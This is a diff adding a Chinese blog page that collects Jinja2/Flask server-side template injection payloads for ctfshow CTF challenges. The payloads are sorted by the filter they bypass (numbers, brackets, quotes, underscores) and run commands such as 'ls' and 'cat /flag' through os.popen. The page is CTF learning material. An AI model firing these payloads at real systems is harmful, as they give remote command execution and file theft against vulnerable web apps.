@@ -1,0 +1,1162 @@
+<!doctype html>
+<html
+  lang="zh-CN" 
+  data-theme-mode="auto"
+  >
+  <head><meta charset="utf-8" />
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1, shrink-to-fit=no"
+/><title>
+  Ctfshow_ssti | Lier
+</title>
+<meta
+  name="description"
+  content="ctfshow里web入门php特性的总结"
+/><script>
+  window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"base\":\"https://www.lier.xin/\",\"clipboard\":{\"copyright\":{\"count\":50,\"enable\":false,\"license_type\":\"by-nc-sa\"},\"fail\":{\"en\":\"Copy failed (ﾟ⊿ﾟ)ﾂ\",\"ja\":\"コピー失敗 (ﾟ⊿ﾟ)ﾂ\",\"zh-cn\":\"复制失败 (ﾟ⊿ﾟ)ﾂ\",\"zh-tw\":\"複製失敗 (ﾟ⊿ﾟ)ﾂ\"},\"success\":{\"en\":\"Copy successfully (*^▽^*)\",\"ja\":\"コピー成功 (*^▽^*)\",\"zh-cn\":\"复制成功 (*^▽^*)\",\"zh-tw\":\"複製成功 (*^▽^*)\"}},\"code_block\":{\"expand\":true},\"icon_font\":\"4552607_0khxww3tj3q9\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"en\":\"This article was last updated on {time}. Please note that the content may no longer be applicable.\",\"ja\":\"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。\",\"zh-cn\":\"本文最后更新于 {time}，请注意文中内容可能已不适用。\",\"zh-tw\":\"本文最後更新於 {time}，請注意文中內容可能已不適用。\"}}}");
+  
+  window.siteConfig.swPath = '\/sw.js';
+  
+</script>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link
+  rel="preload"
+  as="style"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+/>
+<link
+  rel="stylesheet"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+  media="print"
+  onload="this.media='all'"
+/>
+<link
+    rel="preload"
+    href="//at.alicdn.com/t/c/font_4552607_0khxww3tj3q9.woff2"
+    as="font"
+    type="font/woff2"
+    crossorigin="anonymous"
+  /><link rel="stylesheet" href="/css/loader.min.ac746e154f756f8220326eeb52a719f142ab038be5a8ddf30ea5ef15ef2356ea.css" />
+<meta property="og:type" content="website" />
+  <meta property="og:title" content="Ctfshow_ssti | Lier" />
+  <meta
+    property="og:description"
+    content="ctfshow里web入门php特性的总结"
+  />
+  <meta property="og:url" content="https://www.lier.xin/post/ctfshow_ssti/" />
+  <meta
+    property="og:site_name"
+    content="Only_ONE"
+  />
+  <meta
+    property="og:image"
+    content="/images/ctfshow.png"
+  />
+  <meta property="article:author" content="Lier" />
+  <meta property="article:published_time" content="2025-07-22T18:36:38&#43;08:00" />
+  <meta property="article:modified_time" content="2025-07-22T18:36:38&#43;08:00" /><meta property="article:tag" content="CTF-SHOWSSTI" /><meta name="twitter:card" content="summary" />
+  <meta name="twitter:image" content="/images/ctfshow.png" />
+<link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.min.ae1d908d7f5ff8dd2a7f8f641e49366762447f3ee446c7291525d8387ba34463.css" />
+<link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
+    integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei&#43;Zx/1oA/0l8ysE" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/katex@0.16.22/dist/katex.min.css"
+    integrity="sha384-5TcZemv2l/9On385z///&#43;d7MSYlvIEw9FuZTIdZ14vJLqWphw7e7ZPuOiCHJcFCP" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><script
+    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
+    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css"
+    integrity="sha384-4NN3fZ5AokFyHuoihl7A9qWaCt&#43;HsAtOaUsXwJGRb4/SMBtFr2vcNSHR5E8dg0Wk" crossorigin="anonymous"/></head>
+  <body><div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate"><svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+          M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg></div><div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script><div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+<div id="lang-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+本文章没有找到对应的语言版本
+</div><div class="notification-wrapper">
+    <h1>发现新版本</h1>
+    <p>网站好像有新内容，是否更新(ﾟ⊿ﾟ)ﾂ？</p>
+    <div class="notification-btn">
+      <button id="notification-update-btn">更新</button>
+      <button id="notification-close-btn">取消</button>
+    </div>
+  </div><div id="container">
+      <div id="wrap"><div id="header-nav">
+  <nav id="main-nav"><span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <a class="main-nav-link" href="/">首页</a>
+      </span><span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <a class="main-nav-link" href="/archives">归档</a>
+      </span><span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <a class="main-nav-link" href="/about">关于</a>
+      </span><span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <a class="main-nav-link" href="/friend">友链</a>
+      </span><a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav"><a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索"></a></nav></div>
+<header id="header"><picture></picture>
+    <img crossorigin="anonymous" fetchpriority="high" src="/images/ctfshow.png" alt="Ctfshow_ssti"><div id="header-outer">
+    <div id="header-title"><a href="/" id="logo">
+            <h1 data-aos="slide-up">Ctfshow_ssti</h1>
+          </a><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
+  </div>
+</header><div id="content"
+          class="sidebar-left"
+            ><aside id="sidebar"><div class="sidebar-wrapper wrap-sticky">
+    <div
+      class="sidebar-wrap"
+      data-aos="fade-up"
+    ><div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#payload收集">payload收集</a></li>
+    <li><a href="#思路一">思路一</a></li>
+    <li><a href="#思路二">思路二</a></li>
+    <li><a href="#框架tricks">框架tricks</a>
+      <ul>
+        <li><a href="#jinja2">jinja2</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#bypass-1"><code>{}</code>bypass</a>
+      <ul>
+        <li><a href="#姿势">姿势</a></li>
+      </ul>
+    </li>
+    <li><a href="#bypass-2"><code>[]</code>bypass</a></li>
+    <li><a href="#数字bypass">数字bypass</a></li>
+    <li><a href="#bypass-3"><code>''&quot;&quot;</code>bypass</a></li>
+    <li><a href="#_bypass"><code>_</code>bypass</a></li>
+    <li><a href="#数字bypass-1">数字bypass</a></li>
+  </ul>
+</nav>
+  </div>
+</div></div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="Lier"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Lier</div>
+  <div class="sidebar-description">溯本求源，大道至简</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">20</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      3
+    </div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">28</div>
+  </div>
+</div>
+<div class="sidebar-social"><div class="icon-email sidebar-social-icon">
+      <a
+        href="3310338687@qq.com"
+        itemprop="url"
+        target="_blank"
+        aria-label="email"
+        rel="noopener external nofollow noreferrer"
+      ></a>
+    </div><div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/lierbushiwo"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener external nofollow noreferrer"
+      ></a>
+    </div></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="友链"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">友链</div>
+    </div></div>
+</div><div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div></div>
+  </div>
+
+  <div class="sidebar-widget"></div></aside>
+<section id="main"><article
+  class="h-entry article"
+  itemprop="blogPost"
+  itemscope
+  itemtype="https://schema.org/BlogPosting"
+>
+  <div
+    class="article-inner"
+    data-aos="fade-up"
+  >
+    <div class="article-meta"><div class="article-date">
+  <span
+    class="article-date-link"
+    data-aos="zoom-in"
+  >
+    <time datetime="2025-07-22 18:36:38 &#43;0800 &#43;08" itemprop="datePublished"
+      >2025-07-22</time
+    >
+    <time style="display: none;" id="post-update-time"
+      >2025-07-22</time
+    >
+  </span>
+</div>
+<div class="article-category"><a
+      class="article-category-link"
+      href="/categories/learning"
+      data-aos="zoom-in"
+      >LEARNING</a
+    ></div>
+</div>
+    <div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h2 id="payload收集">
+<a class="header-anchor" href="#payload%e6%94%b6%e9%9b%86"></a>
+payload收集
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">## 过滤数字</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">config</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## 中括号</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">get_glashed_messages</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## 下划线</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{(</span><span class="n">lipsum</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">values</span><span class="o">.</span><span class="n">a</span><span class="p">))</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">values</span><span class="o">.</span><span class="n">b</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span><span class="o">&amp;</span><span class="n">a</span><span class="o">=</span><span class="vm">__globals__</span><span class="o">&amp;</span><span class="n">b</span><span class="o">=</span><span class="n">cat</span> <span class="o">/</span><span class="n">flag</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## 引号 中括号</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">config</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="fm">__getitem__</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">x1</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">x2</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## 引号 下划线 中括号</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{(</span><span class="n">lipsum</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">values</span><span class="o">.</span><span class="n">gl</span><span class="p">))</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">values</span><span class="o">.</span><span class="n">f</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span><span class="o">&amp;</span><span class="n">gl</span><span class="o">=</span><span class="vm">__globals__</span><span class="o">&amp;</span><span class="n">f</span><span class="o">=</span><span class="n">ls</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## 引号 下划线 中括号 os</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{(</span><span class="n">lipsum</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">values</span><span class="o">.</span><span class="n">gl</span><span class="p">))</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">values</span><span class="o">.</span><span class="n">x</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">values</span><span class="o">.</span><span class="n">f</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span><span class="o">&amp;</span><span class="n">gl</span><span class="o">=</span><span class="vm">__globals__</span><span class="o">&amp;</span><span class="n">x</span><span class="o">=</span><span class="n">os</span><span class="o">&amp;</span><span class="n">f</span><span class="o">=</span><span class="n">ls</span>
+</span></span><span class="line"><span class="cl"><span class="c1">##&#39;.&#39;,&#39;_&#39;,&#39;|join&#39;,&#39;[&#39;,&#39;]&#39;,&#39;mro&#39;,&#39;base&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">request</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;application&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">globals</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">getitem</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">)(</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">builtins</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">getitem</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">)(</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">import</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">)(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;popen&#39;</span><span class="p">)(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;read&#39;</span><span class="p">)()}}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## 引号 下划线 中括号 {{}} request</span>
+</span></span><span class="line"><span class="cl"><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">a</span><span class="o">=</span><span class="p">(()</span><span class="o">|</span><span class="n">select</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">list</span><span class="p">)</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">24</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>       <span class="o">//</span><span class="n">_</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">gl</span><span class="o">=</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="nb">globals</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}</span> <span class="o">//</span><span class="vm">__globals__</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">bui</span><span class="o">=</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="n">builtins</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">%</span><span class="p">}</span><span class="o">//</span><span class="n">__builtins__</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">a</span><span class="o">=</span><span class="p">(</span><span class="n">lipsum</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">gl</span><span class="p">))</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">bui</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>            
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="nb">chr</span><span class="o">=</span><span class="n">a</span><span class="o">.</span><span class="n">chr</span><span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span><span class="nb">print</span> <span class="n">a</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">47</span><span class="p">)</span><span class="o">~</span><span class="nb">chr</span><span class="p">(</span><span class="mi">102</span><span class="p">)</span><span class="o">~</span><span class="nb">chr</span><span class="p">(</span><span class="mi">108</span><span class="p">)</span><span class="o">~</span><span class="nb">chr</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span><span class="o">~</span><span class="nb">chr</span><span class="p">(</span><span class="mi">103</span><span class="p">))</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## 引号 下划线 中括号 {{}} request 数字</span>
+</span></span><span class="line"><span class="cl"><span class="c1">###直接构造</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">one</span><span class="o">=</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="n">a</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">length</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">two</span><span class="o">=</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="n">aa</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">length</span><span class="p">)</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">print</span> <span class="n">one</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">print</span> <span class="n">two</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">c</span><span class="o">=</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="n">e</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">cc</span><span class="o">=</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="n">ee</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">ccc</span><span class="o">=</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="n">eee</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">cccc</span><span class="o">=</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="n">eeee</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">ccccccc</span><span class="o">=</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="n">eeeeeee</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">cccccccc</span><span class="o">=</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="n">eeeeeeee</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">ccccccccc</span><span class="o">=</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="n">eeeeeeeee</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">cccccccccc</span><span class="o">=</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="n">eeeeeeeeee</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">coun</span><span class="o">=</span><span class="p">(</span><span class="n">cc</span><span class="o">~</span><span class="n">cccc</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span><span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">po</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">po</span><span class="o">=</span><span class="n">a</span><span class="p">,</span><span class="n">p</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">a</span><span class="o">=</span><span class="p">(()</span><span class="o">|</span><span class="n">select</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">list</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">po</span><span class="p">)(</span><span class="n">coun</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">ini</span><span class="o">=</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="n">init</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">()</span><span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">glo</span><span class="o">=</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="nb">globals</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">()</span><span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">geti</span><span class="o">=</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="n">getitem</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">()</span><span class="o">%</span><span class="p">}</span>
